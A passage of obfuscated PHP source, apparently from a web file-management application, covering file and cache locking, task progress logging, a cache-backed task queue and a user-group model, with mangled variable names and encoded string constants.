lockGet($Ï˜ÑµÃæ) { $Ëİ´ÉÓõ = self::key($Ï˜ÑµÃæ); if (self::$lockItem[$Ëİ´ÉÓõ]) { return self::$lockItem[$Ëİ´ÉÓõ]; } return self::init()->lockGet($Ëİ´ÉÓõ); } public static function unlock($à®“±¤à) { $ĞÎÜ =& $_SERVER[ùèÅ´Ãš]; $í¶àæ¸æ = self::key($à®“±¤à); self::$lockItem[$í¶àæ¸æ] = null; self::init()->unlock($í¶àæ¸æ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ĞÎÜ[940] . $à®“±¤à, $ĞÎÜ[927]); } return; } public static function unlockRuntime() { $¥ÙÇƒğç =& $_SERVER[ùèÅ´Ãš]; $ÁÒîŠ¶ = self::init(); $šÏàìÖ¸ = !1; foreach (self::$lockItem as $üĞĞ¬¼ê => $‚´Äî¡Ñ) { if (!$‚´Äî¡Ñ) { continue; } $ÁÒîŠ¶->unlock($üĞĞ¬¼ê); if (!$šÏàìÖ¸) { $šÏàìÖ¸ = !0; write_log($¥ÙÇƒğç[941] . $üĞĞ¬¼ê . $¥ÙÇƒğç[74] . get_caller_msg(), $¥ÙÇƒğç[927]); continue; } write_log($¥ÙÇƒğç[941] . $üĞĞ¬¼ê, $¥ÙÇƒğç[927]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Àö®¹ê¨ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¥ÙÇƒğç[942] . $Àö®¹ê¨ . $¥ÙÇƒğç[943] . ACTION, $¥ÙÇƒğç[927]); } } public static function fileLock($–÷ÃÆÛ ) { $‰¨¶–İá =& $_SERVER[ùèÅ´Ãš]; if (!$GLOBALS[$‰¨¶–İá[944]]) { $GLOBALS[$‰¨¶–İá[944]] = array(); } $GLOBALS[$‰¨¶–İá[944]][$–÷ÃÆÛ ] = !1; $Ë‹Ê½¾¢ = fopen(DATA_PATH . $–÷ÃÆÛ  . $‰¨¶–İá[945], $‰¨¶–İá[946]); if (!$Ë‹Ê½¾¢) { return !1; } $GLOBALS[$‰¨¶–İá[944]][$–÷ÃÆÛ ] = $Ë‹Ê½¾¢; if (flock($Ë‹Ê½¾¢, LOCK_EX)) { return !0; } self::unlock($–÷ÃÆÛ ); show_json($‰¨¶–İá[947], !1); return !1; } public static function fileUnlock($µ€”à¸ü) { $’«ª³³Œ =& $_SERVER[ùèÅ´Ãš]; $ïúÄ¨ª­ = $GLOBALS[$’«ª³³Œ[944]][$µ€”à¸ü]; if (!$ïúÄ¨ª­) { return; } $GLOBALS[$’«ª³³Œ[944]][$µ€”à¸ü] = !1; flock($ïúÄ¨ª­, LOCK_UN); fclose($ïúÄ¨ª­); } public static function fileUnlockAll() { $É„±ä™ =& $_SERVER[ùèÅ´Ãš]; if (!isset($GLOBALS[$É„±ä™[944]]) || !$GLOBALS[$É„±ä™[944]]) { return; } foreach ($GLOBALS[$É„±ä™[944]] as $éº›¢ê½ => $¤ó™®ºö) { if (!$¤ó™®ºö) { continue; } $GLOBALS[$É„±ä™[944]][$éº›¢ê½] = !1; flock($¤ó™®ºö, LOCK_UN); fclose($¤ó™®ºö); } $GLOBALS[$É„±ä™[944]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ú‹¼‹©å =& $_SERVER[ùèÅ´Ãš]; $ıâ¶í = $GLOBALS[$ú‹¼‹©å[6]][$ú‹¼‹©å[426]]; self::$cachePath = $ıâ¶í[$ú‹¼‹©å[233]][$ú‹¼‹©å[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($÷¨ğ®Ó, $ªì£¨ŒÕ = 0) { $ó‚¬è€× =& $_SERVER[ùèÅ´Ãš]; $™ºÚŸ« = microtime(!0); $ó‚ ğ°ø = $™ºÚŸ« + $ªì£¨ŒÕ + 0.0001; $şïÕÒÁ = rtrim(self::$cachePath, $ó‚¬è€×[8]) . $ó‚¬è€×[948] . md5($÷¨ğ®Ó) . $ó‚¬è€×[945]; if (file_exists($şïÕÒÁ) && filemtime($şïÕÒÁ) && filemtime($şïÕÒÁ) < time() - 10) { @unlink($şïÕÒÁ); } do { if (file_exists($şïÕÒÁ)) { cacheLockWait(); continue; } $œ×ôÖšù = fopen($şïÕÒÁ, $ó‚¬è€×[949]); if (!$œ×ôÖšù) { return !1; } $áÄıÜ†½ = flock($œ×ôÖšù, LOCK_EX | LOCK_NB); self::$caches[$÷¨ğ®Ó] = array($ó‚¬è€×[950] => $œ×ôÖšù, $ó‚¬è€×[233] => $şïÕÒÁ); fwrite($œ×ôÖšù, $ó‚ ğ°ø); clearstatcache(); if ($œ×ôÖšù && $áÄıÜ†½) { return !0; } cacheLockWait(); } while (microtime(!0) < $ó‚ ğ°ø); $this->unlock($÷¨ğ®Ó); return !1; } public function lockGet($ÔÚøÃï) { $ƒ÷š¬® =& $_SERVER[ùèÅ´Ãš]; $Í±Ï”¦ú = rtrim(self::$cachePath, $ƒ÷š¬®[8]) . $ƒ÷š¬®[948] . md5($ÔÚøÃï) . $ƒ÷š¬®[945]; return file_exists($Í±Ï”¦ú); } public function unlock($“Ä¢Õ¹) { $ã€¨ñß± =& $_SERVER[ùèÅ´Ãš]; $’à‹Áıº = self::$caches[$“Ä¢Õ¹]; if (!$’à‹Áıº) { return; } @flock($’à‹Áıº[$ã€¨ñß±[950]], LOCK_UN); @fclose($’à‹Áıº[$ã€¨ñß±[950]]); @unlink($’à‹Áıº[$ã€¨ñß±[233]]); unset(self::$caches[$“Ä¢Õ¹]); } } goto FÉ¶¾‘ƒæ˜; BßîÀ‚ÆĞ“: class TaskHttp extends Task { protected function startAfter() { $ÏÆËıÔ¶ =& $_SERVER[ùèÅ´Ãš]; $Î½²å§³ =& $this->task; $Î½²å§³[$ÏÆËıÔ¶[1875]] = 1; Hook::bind($ÏÆËıÔ¶[1843], array($this, $ÏÆËıÔ¶[1876])); Hook::bind($ÏÆËıÔ¶[1845], array($this, $ÏÆËıÔ¶[1877])); Hook::bind($ÏÆËıÔ¶[1847], array($this, $ÏÆËıÔ¶[1878])); } protected function endAfter() { $ ˜Ã›üÆ =& $_SERVER[ùèÅ´Ãš]; Hook::unbind($ ˜Ã›üÆ[1843], array($this, $ ˜Ã›üÆ[1876])); Hook::unbind($ ˜Ã›üÆ[1845], array($this, $ ˜Ã›üÆ[1877])); Hook::unbind($ ˜Ã›üÆ[1847], array($this, $ ˜Ã›üÆ[1878])); } public function progressStart($ıÉ½íıÚ) { $¨ˆ‹ ÷î =& $_SERVER[ùèÅ´Ãš]; $ƒÈó…ºÑ = curl_getinfo($ıÉ½íıÚ); self::log($¨ˆ‹ ÷î[1879] . $ƒÈó…ºÑ[$¨ˆ‹ ÷î[384]]); self::valueSet($this->task[$¨ˆ‹ ÷î[477]], $this->task); } public function progressEnd($îåœ¡î†) { $˜ÆÆÓĞü =& $_SERVER[ùèÅ´Ãš]; self::log($˜ÆÆÓĞü[1880] . $this->task[$˜ÆÆÓĞü[477]]); $this->end(); } public function progress($‘Ãˆ«½Ì, $¦¦×É¯«, $õ†­é×Ú, $÷ë­Î¿µ, $ù”£Áˆ±) { $Ìš²˜îÜ =& $_SERVER[ùèÅ´Ãš]; $´Ê³óËï =& $this->task; if ($ù”£Áˆ± > 0) { $´Ê³óËï[$Ìš²˜îÜ[1151]] = $´Ê³óËï[$Ìš²˜îÜ[1151]] == 0 ? $÷ë­Î¿µ : $´Ê³óËï[$Ìš²˜îÜ[1151]]; $´Ê³óËï[$Ìš²˜îÜ[1798]] = $ù”£Áˆ±; } else { if ($õ†­é×Ú > 0) { $´Ê³óËï[$Ìš²˜îÜ[1151]] = $´Ê³óËï[$Ìš²˜îÜ[1151]] == 0 ? $¦¦×É¯« : $´Ê³óËï[$Ìš²˜îÜ[1151]]; $´Ê³óËï[$Ìš²˜îÜ[1798]] = $õ†­é×Ú; } } $this->update(); self::log("\x70\x72\157\147\162\x65\x73\163\x48\164\x74\x70\x3a\x64\x6f\x77\156\x3a{$õ†­é×Ú}\57{$¦¦×É¯«}\73\40\165\x70\x6c\x6f\x61\x64\72{$ù”£Áˆ±}\57{$÷ë­Î¿µ}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($­Ú‚ÖÏ, $Ûı¢Ò¤Ñ = '', $±Úãò³ë = 0, $¿Ü€¾ÌÊ = '') { $îÇµü€¤ =& $_SERVER[ùèÅ´Ãš]; $¿Ü€¾ÌÊ = $¿Ü€¾ÌÊ ? $¿Ü€¾ÌÊ : ($Ûı¢Ò¤Ñ ? $Ûı¢Ò¤Ñ : $­Ú‚ÖÏ); $ ££õğ¼ = new Task($­Ú‚ÖÏ, $Ûı¢Ò¤Ñ, $±Úãò³ë, $¿Ü€¾ÌÊ); $GLOBALS[$îÇµü€¤[1881] . $­Ú‚ÖÏ] = new TaskLog($îÇµü€¤[1780], $ ££õğ¼, $¿Ü€¾ÌÊ); return $ ££õğ¼; } public function __construct($Îˆˆ¬ùà = '', $Ş«ÃæÕ¨ = '', $€ñº§¡½ = '') { $ÄÁ±…ô =& $_SERVER[ùèÅ´Ãš]; if (!$Îˆˆ¬ùà) { $Îˆˆ¬ùà = $ÄÁ±…ô[1780]; } $µø‹ï†­ = $Îˆˆ¬ùà . $ÄÁ±…ô[464] . rand_string(10); if (!$€ñº§¡½) { $€ñº§¡½ = $Îˆˆ¬ùà . $ÄÁ±…ô[53] . $€ñº§¡½; } switch ($Îˆˆ¬ùà) { case $ÄÁ±…ô[1780]: if (!$Ş«ÃæÕ¨ || !$Ş«ÃæÕ¨->task) { return echoLog($Îˆˆ¬ùà . $ÄÁ±…ô[1882]); } $¯Ãéı»ˆ = $Ş«ÃæÕ¨; $µø‹ï†­ = $¯Ãéı»ˆ->task[$ÄÁ±…ô[477]]; $Îˆˆ¬ùà = $¯Ãéı»ˆ->task[$ÄÁ±…ô[477]]; if (!$¯Ãéı»ˆ->task[$ÄÁ±…ô[1683]]) { $¯Ãéı»ˆ->task[$ÄÁ±…ô[1683]] = $€ñº§¡½ ? $€ñº§¡½ : $Îˆˆ¬ùà; } break; case $ÄÁ±…ô[1883]: if (!$Ş«ÃæÕ¨) { return echoLog($Îˆˆ¬ùà . $ÄÁ±…ô[1884]); } $ù§ê·Ûœ = is_string($Ş«ÃæÕ¨) ? array($Ş«ÃæÕ¨) : $Ş«ÃæÕ¨; $¯Ãéı»ˆ = new TaskFileTransfer($µø‹ï†­, $Îˆˆ¬ùà, 0, $€ñº§¡½ ? $€ñº§¡½ : $ù§ê·Ûœ[0]); foreach ($ù§ê·Ûœ as $½“éë™‘) { $¯Ãéı»ˆ->addPath($½“éë™‘); } break; case $ÄÁ±…ô[390]: if (!$Ş«ÃæÕ¨) { return echoLog($Îˆˆ¬ùà . $ÄÁ±…ô[1884]); } $ù§ê·Ûœ = is_string($Ş«ÃæÕ¨) ? array($Ş«ÃæÕ¨) : $Ş«ÃæÕ¨; $¯Ãéı»ˆ = new TaskZip($µø‹ï†­, $Îˆˆ¬ùà, 0, $€ñº§¡½ ? $€ñº§¡½ : $ù§ê·Ûœ[0]); foreach ($ù§ê·Ûœ as $½“éë™‘) { $¯Ãéı»ˆ->addPath($½“éë™‘); } break; case $ÄÁ±…ô[1313]: if (!$Ş«ÃæÕ¨) { return echoLog($Îˆˆ¬ùà . $ÄÁ±…ô[1884]); } $¯Ãéı»ˆ = new TaskUnZip($µø‹ï†­, $Îˆˆ¬ùà, 0, $€ñº§¡½ ? $€ñº§¡½ : $Ş«ÃæÕ¨); if ($Ş«ÃæÕ¨) { $¯Ãéı»ˆ->addFile($Ş«ÃæÕ¨); } break; case $ÄÁ±…ô[152]: $¯Ãéı»ˆ = new TaskHttp($µø‹ï†­, $Îˆˆ¬ùà); break; default: return; break; } $this->task = $¯Ãéı»ˆ; $this->taskID = $µø‹ï†­; Hook::bind($ÄÁ±…ô[1818], array($this, $ÄÁ±…ô[1885])); Hook::bind($ÄÁ±…ô[1820], array($this, $ÄÁ±…ô[1886])); Hook::bind($ÄÁ±…ô[1814], array($this, $ÄÁ±…ô[1887])); echoLog($ÄÁ±…ô[1888] . $¯Ãéı»ˆ->task[$ÄÁ±…ô[1683]]); } public function __destruct() { $this->end(); } public function end($ÙùÄÇ¯Ô = '') { $Âãã½î‚ =& $_SERVER[ùèÅ´Ãš]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ÙùÄÇ¯Ô); $this->task = !1; $this->taskID = !1; Hook::unbind($Âãã½î‚[1818], array($this, $Âãã½î‚[1885])); Hook::unbind($Âãã½î‚[1820], array($this, $Âãã½î‚[1886])); Hook::unbind($Âãã½î‚[1814], array($this, $Âãã½î‚[1887])); } public function taskUpdate($½üÅ™©Ô) { $‡ó÷¢ßè =& $_SERVER[ùèÅ´Ãš]; if (!$½üÅ™©Ô || $this->taskID != $½üÅ™©Ô[$‡ó÷¢ßè[477]]) { return; } $˜¿ë‹ß÷ = 20; $ÏîÄä¾ = intval($½üÅ™©Ô[$‡ó÷¢ßè[1799]] * $˜¿ë‹ß÷); $†ÕÜéŒ— = $‡ó÷¢ßè[176] . str_repeat($‡ó÷¢ßè[508], $ÏîÄä¾) . $‡ó÷¢ßè[1102] . str_repeat($‡ó÷¢ßè[53], $˜¿ë‹ß÷ - $ÏîÄä¾) . $‡ó÷¢ßè[178]; $­èÜä·‚ = $†ÕÜéŒ— . sprintf($‡ó÷¢ßè[1889], $½üÅ™©Ô[$‡ó÷¢ßè[1799]] * 100) . $‡ó÷¢ßè[1890]; $Íù»ïà¬ = $­èÜä·‚ . $½üÅ™©Ô[$‡ó÷¢ßè[1798]] . $‡ó÷¢ßè[8] . $½üÅ™©Ô[$‡ó÷¢ßè[1151]] . LNG($‡ó÷¢ßè[1891]); $üÏÛùèò = $‡ó÷¢ßè[12]; if ($½üÅ™©Ô[$‡ó÷¢ßè[1875]]) { $Íù»ïà¬ = $­èÜä·‚ . size_format($½üÅ™©Ô[$‡ó÷¢ßè[1798]]) . $‡ó÷¢ßè[8] . size_format($½üÅ™©Ô[$‡ó÷¢ßè[1151]]); $üÏÛùèò = size_format($½üÅ™©Ô[$‡ó÷¢ßè[1800]]) . $‡ó÷¢ßè[1892]; } if ($½üÅ™©Ô[$‡ó÷¢ßè[1153]]) { $½üÅ™©Ô[$‡ó÷¢ßè[1849]] = $½üÅ™©Ô[$‡ó÷¢ßè[1153]] . $‡ó÷¢ßè[53] . $½üÅ™©Ô[$‡ó÷¢ßè[1849]]; } if ($½üÅ™©Ô[$‡ó÷¢ßè[1849]]) { $±ÜÏãº± = $‡ó÷¢ßè[12]; if ($½üÅ™©Ô[$‡ó÷¢ßè[1851]]) { $±ÜÏãº± = $‡ó÷¢ßè[50] . size_format($½üÅ™©Ô[$‡ó÷¢ßè[1852]]) . $‡ó÷¢ßè[8] . size_format($½üÅ™©Ô[$‡ó÷¢ßè[1851]]); } $üÏÛùèò .= $½üÅ™©Ô[$‡ó÷¢ßè[1849]] . $±ÜÏãº±; } if ($½üÅ™©Ô[$‡ó÷¢ßè[841]] && !$½üÅ™©Ô[$‡ó÷¢ßè[1851]]) { $üÏÛùèò .= $‡ó÷¢ßè[53] . size_format($½üÅ™©Ô[$‡ó÷¢ßè[1856]]) . $‡ó÷¢ßè[8] . size_format($½üÅ™©Ô[$‡ó÷¢ßè[841]]); } echoLog($Íù»ïà¬ . $‡ó÷¢ßè[53] . $üÏÛùèò, !0); } public function taskEnd($èÃ¿á×) { $Ô¹­¥ÈŸ =& $_SERVER[ùèÅ´Ãš]; if (!$èÃ¿á× || $this->taskID != $èÃ¿á×[$Ô¹­¥ÈŸ[477]]) { return; } $ş—úËŞÒ = $èÃ¿á× ? LNG($Ô¹­¥ÈŸ[1893]) . $Ô¹­¥ÈŸ[4] . $èÃ¿á×[$Ô¹­¥ÈŸ[1798]] . $Ô¹­¥ÈŸ[8] . $èÃ¿á×[$Ô¹­¥ÈŸ[1151]] . LNG($Ô¹­¥ÈŸ[1891]) . $Ô¹­¥ÈŸ[74] : $Ô¹­¥ÈŸ[12]; echoLog($Ô¹­¥ÈŸ[1894] . $èÃ¿á×[$Ô¹­¥ÈŸ[1683]] . ($èÃ¿á×[$Ô¹­¥ÈŸ[528]] ? $Ô¹­¥ÈŸ[74] . $èÃ¿á×[$Ô¹­¥ÈŸ[528]] : $Ô¹­¥ÈŸ[12]) . $Ô¹­¥ÈŸ[74] . $ş—úËŞÒ . $Ô¹­¥ÈŸ[1895] . sprintf($Ô¹­¥ÈŸ[935], timeFloat() - $èÃ¿á×[$Ô¹­¥ÈŸ[1801]]) . $Ô¹­¥ÈŸ[1813]); $this->end(); } public function taskKill($ÅÚï…) { $ÙÎé´õ… =& $_SERVER[ùèÅ´Ãš]; if (!$ÅÚï… || $this->taskID != $ÅÚï…[$ÙÎé´õ…[477]]) { return; } echoLog($ÙÎé´õ…[1896] . $ÅÚï…[$ÙÎé´õ…[1683]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\x73\x6b\x51\165\145\165\145\114\x65\156\x67\164\x68"; const QUEUE_DATA = "\164\141\163\153\121\165\145\x75\x65\x44\x61\164\x61"; const QUEUE_TIME = "\x74\x61\x73\x6b\x51\165\x65\165\x65\114\x61\x73\164\x52\x75\156"; const QUEUE_THREAD = "\164\141\163\x6b\x51\x75\x65\x75\x65\124\150\x72\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Ú®’—ğ½, $Îø»æÚ± = array(), $«¿¼¢Â° = '', $ü˜Ë„¢™ = '') { $êÅà­” =& $_SERVER[ùèÅ´Ãš]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ü˜Ë„¢™ && array_find_by_field(self::$listData, $êÅà­”[97], $ü˜Ë„¢™)) { return !0; } if ($ü˜Ë„¢™ && array_find_by_field(self::$listDataAdd, $êÅà­”[97], $ü˜Ë„¢™)) { return !0; } self::$listDataAdd[] = array($êÅà­”[344] => $Ú®’—ğ½, $êÅà­”[1897] => $Îø»æÚ±, $êÅà­”[528] => $«¿¼¢Â°, $êÅà­”[97] => $ü˜Ë„¢™); return !0; } public static function addSubmit() { $ÒÜ‚é‰º =& $_SERVER[ùèÅ´Ãš]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ÒÜ‚é‰º[1898] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ÒÜ‚é‰º[12], $ÒÜ‚é‰º[528])), $ÒÜ‚é‰º[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($º¼ŠêÜĞ, $ãØ‘‘ü¬ = array(), $—³—‘×” = '', $œî¼†–ü = '') { $µÒÙÜ‡ =& $_SERVER[ùèÅ´Ãš]; if (self::count() >= self::MAX_LENGTH) { return !1; } $œƒ—ıÚ£ = self::getAll(); if ($œî¼†–ü && array_find_by_field($œƒ—ıÚ£, $µÒÙÜ‡[97], $œî¼†–ü)) { return !0; } $œƒ—ıÚ£[] = array($µÒÙÜ‡[344] => $º¼ŠêÜĞ, $µÒÙÜ‡[1897] => $ãØ‘‘ü¬, $µÒÙÜ‡[528] => $—³—‘×”, $µÒÙÜ‡[97] => $œî¼†–ü); self::setAll($œƒ—ıÚ£); write_log($µÒÙÜ‡[1898] . $—³—‘×”, $µÒÙÜ‡[198]); return !0; } public static function run() { $¢Ö—‹ë› =& $_SERVER[ùèÅ´Ãš]; $„¯©üìË = self::getAll(); $Ñø‡¶œ¸ = array_shift($„¯©üìË); if (!$Ñø‡¶œ¸) { return !1; } self::setAll($„¯©üìË); $éÇúÕôè = timeFloat(); $¬Î‚å¨Ë = $¢Ö—‹ë›[12]; try { $¬Î‚å¨Ë = Hook::apply($Ñø‡¶œ¸[$¢Ö—‹ë›[344]], $Ñø‡¶œ¸[$¢Ö—‹ë›[1897]]); } catch (Exception $·í¤Ä®–) { write_log($·í¤Ä®–, $¢Ö—‹ë›[1278]); } $³ÒÁ®¤¤ = number_format(timeFloat() - $éÇúÕôè, 3) . $¢Ö—‹ë›[1813]; if ($¬Î‚å¨Ë && is_string($¬Î‚å¨Ë)) { $³ÒÁ®¤¤ = $³ÒÁ®¤¤ . $¢Ö—‹ë›[1899] . $¬Î‚å¨Ë; } write_log($¢Ö—‹ë›[1900] . $Ñø‡¶œ¸[$¢Ö—‹ë›[528]] . $¢Ö—‹ë›[1901] . $³ÒÁ®¤¤, $¢Ö—‹ë›[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $şóÈªÌš =& $_SERVER[ùèÅ´Ãš]; $ìÎ­¸¥õ = self::threadCount() + 1; if ($ìÎ­¸¥õ > 3 || !self::count()) { return; } write_log($şóÈªÌš[1902] . $ìÎ­¸¥õ, $şóÈªÌš[198]); Cache::set(self::QUEUE_THREAD, $ìÎ­¸¥õ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($şóÈªÌš[1903], $şóÈªÌš[198]); } public static function getKey($ÄííÌÀ˜, $÷™Ú˜›‹ = "\x69\x6e\164") { $Ä¹“ÏÑ· =& $_SERVER[ùèÅ´Ãš]; Cache::removeMemory($ÄííÌÀ˜); $ñ‘İº§  = Cache::get($ÄííÌÀ˜); if ($÷™Ú˜›‹ == $Ä¹“ÏÑ·[366]) { return $ñ‘İº§  ? intval($ñ‘İº§ ) : 0; } if ($÷™Ú˜›‹ == $Ä¹“ÏÑ·[1904]) { return is_array($ñ‘İº§ ) ? $ñ‘İº§  : array(); } return $ñ‘İº§ ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ùèÅ´Ãš][1904]); } public static function setAll($šÀÁÈúÍ) { $„–¹™ÂŠ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($šÀÁÈúÍ), $„–¹™ÂŠ); Cache::set(self::QUEUE_DATA, $šÀÁÈúÍ, $„–¹™ÂŠ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto Dİ‰Ú‹çêë; c’èÊ°ÓÕá: class GroupModel extends ModelBase { protected $tableName = "\147\162\157\x75\160"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\x6d\x65" => "\147\162\x6f\x75\160\137\x6d\x65\x74\141", "\x6d\x65\x74\x61\106\151\145\154\144" => "\x67\x72\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($™’Åßæ) { $­æÔµ•» =& $_SERVER[ùèÅ´Ãš]; return array($­æÔµ•»[2079] => array($™’Åßæ[0], $­æÔµ•»[2080]), $­æÔµ•»[2081] => array($™’Åßæ[0], $­æÔµ•»[2082])); } protected function getInfo($²ã´ªçÁ, $°÷İ·Ëå = false) { $‡çƒÙÏ = $this->getInfoSimple($²ã´ªçÁ); if (!$‡çƒÙÏ) { return !1; } if ($°÷İ·Ëå) { return $this->_listDataApplyItem($‡çƒÙÏ); } return $this->cacheFunctionGet($_SERVER[ùèÅ´Ãš][2083], $²ã´ªçÁ); } protected function getInfoSimple($ÊÅà—²ã, $İ¢úï•€ = false) { $ËÈÁ¨×é =& $_SERVER[ùèÅ´Ãš]; if ($İ¢úï•€) { $±±âå£¸ = array($ËÈÁ¨×é[1404] => intval($ÊÅà—²ã)); $íêí×Ğ = $this->where($±±âå£¸)->find(); return is_array($íêí×Ğ) ? $íêí×Ğ : array(); } return $this->cacheFunctionGet($ËÈÁ¨×é[2084], $ÊÅà—²ã); } protected function groupAdd($­¥”ãÉ’) { $‹„ÜàĞ =& $_SERVER[ùèÅ´Ãš]; if (!$­¥”ãÉ’[$‹„ÜàĞ[193]] && isset($­¥”ãÉ’[$‹„ÜàĞ[1404]]) && $­¥”ãÉ’[$‹„ÜàĞ[1404]] == 1) { if ($ƒ±æÕçÄ = $this->getInfoSimple($­¥”ãÉ’[$‹„ÜàĞ[1404]], !0)) { return $­¥”ãÉ’[$‹„ÜàĞ[1404]]; } } else { $ƒ±æÕçÄ = $this->getInfoSimple($­¥”ãÉ’[$‹„ÜàĞ[193]]); if (!$ƒ±æÕçÄ) { return !1; } } $€¯¥Çœ¡ = $‹„ÜàĞ[597]; if ($ƒ±æÕçÄ[$‹„ÜàĞ[588]]) { $€¯¥Çœ¡ = $ƒ±æÕçÄ[$‹„ÜàĞ[588]] . $ƒ±æÕçÄ[$‹„ÜàĞ[1404]] . $‹„ÜàĞ[50]; } $ëÑ¿İÔ = array($‹„ÜàĞ[496] => $this->groupNameAuto($­¥”ãÉ’[$‹„ÜàĞ[193]], $­¥”ãÉ’[$‹„ÜàĞ[32]]), $‹„ÜàĞ[479] => $­¥”ãÉ’[$‹„ÜàĞ[193]], $‹„ÜàĞ[659] => $€¯¥Çœ¡, $‹„ÜàĞ[2085] => $­¥”ãÉ’[$‹„ÜàĞ[1984]], $‹„ÜàĞ[2086] => 0, $‹„ÜàĞ[2001] => 0); $­¥”ãÉ’[$‹„ÜàĞ[32]] = $ëÑ¿İÔ[$‹„ÜàĞ[32]]; if (isset($­¥”ãÉ’[$‹„ÜàĞ[2021]])) { $ëÑ¿İÔ[$‹„ÜàĞ[2021]] = $­¥”ãÉ’[$‹„ÜàĞ[2021]]; } else { $¡ŠÂÕá = $this->max($‹„ÜàĞ[2021]); if (!$¡ŠÂÕá) { $¡ŠÂÕá = 0; } $ëÑ¿İÔ[$‹„ÜàĞ[2021]] = $¡ŠÂÕá + 1; } if (!empty($­¥”ãÉ’[$‹„ÜàĞ[1404]])) { $ëÑ¿İÔ[$‹„ÜàĞ[1404]] = $­¥”ãÉ’[$‹„ÜàĞ[1404]]; } $ş½¦Óˆ = $this->add($ëÑ¿İÔ); $this->groupMetaEdit($ş½¦Óˆ, $­¥”ãÉ’); Model($‹„ÜàĞ[1442])->groupRootAdd($ş½¦Óˆ); $this->_clearCache($­¥”ãÉ’[$‹„ÜàĞ[193]]); return $ş½¦Óˆ; } protected function groupEdit($å˜İ¡‹Ñ, $ğ ‹ƒ»®) { $ìÇŠ’ÛÏ =& $_SERVER[ùèÅ´Ãš]; $šÔ·Èê¼ = $this->getInfoSimple($å˜İ¡‹Ñ); if (!$šÔ·Èê¼) { return !1; } if (!empty($ğ ‹ƒ»®[$ìÇŠ’ÛÏ[193]])) { $çêô«¸Ï = $this->getInfoSimple($ğ ‹ƒ»®[$ìÇŠ’ÛÏ[193]]); if (!$çêô«¸Ï) { return !1; } if ($šÔ·Èê¼[$ìÇŠ’ÛÏ[1404]] == $çêô«¸Ï[$ìÇŠ’ÛÏ[1404]]) { return !1; } if ($ğ ‹ƒ»®[$ìÇŠ’ÛÏ[193]] != $šÔ·Èê¼[$ìÇŠ’ÛÏ[193]]) { if ($çêô«¸Ï[$ìÇŠ’ÛÏ[588]] !== $šÔ·Èê¼[$ìÇŠ’ÛÏ[588]] && strpos($çêô«¸Ï[$ìÇŠ’ÛÏ[588]], $šÔ·Èê¼[$ìÇŠ’ÛÏ[588]] . $šÔ·Èê¼[$ìÇŠ’ÛÏ[1404]] . $ìÇŠ’ÛÏ[50]) === 0) { return !1; } $ğ ‹ƒ»®[$ìÇŠ’ÛÏ[659]] = $çêô«¸Ï[$ìÇŠ’ÛÏ[588]] . $ğ ‹ƒ»®[$ìÇŠ’ÛÏ[193]] . $ìÇŠ’ÛÏ[50]; $this->_changeChildLevel($šÔ·Èê¼, $çêô«¸Ï); $this->_clearCache($çêô«¸Ï[$ìÇŠ’ÛÏ[1404]]); $this->_clearCache($šÔ·Èê¼[$ìÇŠ’ÛÏ[193]]); } } $this->groupMetaEdit($å˜İ¡‹Ñ, $ğ ‹ƒ»®); $this->_clearChildrenCache($šÔ·Èê¼); return $this->where(array($ìÇŠ’ÛÏ[2087] => $å˜İ¡‹Ñ))->save($ğ ‹ƒ»®); } private function groupMetaEdit($Øğ¾éŠ•, &$ƒÅÜ¶Û) { $ºäŠı¼§ =& $_SERVER[ùèÅ´Ãš]; if (isset($ƒÅÜ¶Û[$ºäŠı¼§[32]])) { $this->setNamePinyin($Øğ¾éŠ•, $ƒÅÜ¶Û[$ºäŠı¼§[32]]); } if (isset($ƒÅÜ¶Û[$ºäŠı¼§[2088]])) { $½Ä ¸¼ = array($ºäŠı¼§[2088] => $ƒÅÜ¶Û[$ºäŠı¼§[2088]], $ºäŠı¼§[2089] => $ƒÅÜ¶Û[$ºäŠı¼§[2089]]); unset($ƒÅÜ¶Û[$ºäŠı¼§[2088]]); unset($ƒÅÜ¶Û[$ºäŠı¼§[2089]]); if (isset($ƒÅÜ¶Û[$ºäŠı¼§[2090]])) { $ºâ²óèš = $ºäŠı¼§[1400] . $Øğ¾éŠ•; $¸Ìà™İÄ = $ºäŠı¼§[1399]; $œÓ·Æ‡Ğ = $ƒÅÜ¶Û[$ºäŠı¼§[2090]] ? $ƒÅÜ¶Û[$ºäŠı¼§[2090]] : $ºäŠı¼§[12]; $õ£èã­Ì = Model($ºäŠı¼§[1398])->get($ºâ²óèš, $¸Ìà™İÄ); $õ£èã­Ì = $õ£èã­Ì ? $õ£èã­Ì : $ºäŠı¼§[12]; if ($õ£èã­Ì != $œÓ·Æ‡Ğ) { if (!$œÓ·Æ‡Ğ && 